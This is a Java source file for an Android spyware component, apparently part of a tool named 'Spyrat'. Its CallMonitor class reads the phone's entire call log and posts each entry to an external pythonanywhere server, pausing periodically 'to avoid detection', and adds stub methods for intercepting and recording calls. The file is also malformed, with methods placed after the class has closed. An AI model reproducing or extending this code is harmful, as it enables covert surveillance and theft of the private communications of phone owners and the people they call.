package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;

public class CallMonitor {
    private static final String TAG = "SpyratCalls";

    public static void collectAndSendCalls(Context context, String deviceId, String investigatorCode) {
        try {
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    JSONObject callData = new JSONObject();
                    
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    long callDate = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    int callType = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));

                    callData.put("number", number);
                    callData.put("name", name != null ? name : "Unknown");
                    callData.put("duration", duration);
                    callData.put("timestamp", callDate);
                    callData.put("date", formatDate(callDate));
                    callData.put("type", getCallType(callType));

                    // Send individual call log
                    sendCallData(deviceId, investigatorCode, callData);
                    count++;

                    // Pause to avoid detection
                    if (count % 10 == 0) Thread.sleep(2000);
                }
                cursor.close();
                Log.d(TAG, "✅ Call logs " + count + " zimetumwa");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Call log error: " + e.getMessage());
        }
    }

    private static String getCallType(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            case CallLog.Calls.REJECTED_TYPE:
                return "Rejected";
            default:
                return "Unknown";
        }
    }

    private static String formatDate(long timestamp) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            return sdf.format(new Date(timestamp));
        } catch (Exception e) {
            return String.valueOf(timestamp);
        }
    }

    private static void sendCallData(String deviceId, String investigatorCode, JSONObject callData) {
        try {
            JSONObject postData = new JSONObject();
            postData.put("device_id", deviceId);
            postData.put("investigator_code", investigatorCode);
            postData.put("data_type", "call_log");
            postData.put("data_content", callData);

            NetworkManager.sendPost("https://GhostTester.pythonanywhere.com/api/investigator/data", postData.toString());
        } catch (Exception e) {
            Log.e(TAG, "❌ Call log send error: " + e.getMessage());
        }
    }
}

    // ==================== NEW METHODS ====================
    
    public void monitorIncomingCalls() {
        try {
            Log.d(TAG, "📞 Monitoring incoming calls...");
            // Implementation for real-time call monitoring
            // This would use PhoneStateListener in real implementation
        } catch (Exception e) {
            Log.e(TAG, "❌ Call monitoring error: " + e.getMessage());
        }
    }
    
    public void interceptCall(String phoneNumber) {
        try {
            Log.d(TAG, "📞 Intercepting call to: " + phoneNumber);
            // Implementation for call interception
            // This would use TelecomManager in real implementation
        } catch (Exception e) {
            Log.e(TAG, "❌ Call intercept error: " + e.getMessage());
        }
    }
    
    public void startCallRecording() {
        try {
            Log.d(TAG, "🎙️ Starting call recording...");
            // Implementation for call recording
            // This would use MediaRecorder in real implementation
        } catch (Exception e) {
            Log.e(TAG, "❌ Call recording error: " + e.getMessage());
        }
    }
    
    public void cleanup() {
        try {
            Log.d(TAG, "🧹 Cleaning up CallMonitor resources...");
            // Cleanup resources
        } catch (Exception e) {
            Log.e(TAG, "❌ CallMonitor cleanup error: " + e.getMessage());
        }
    }
}
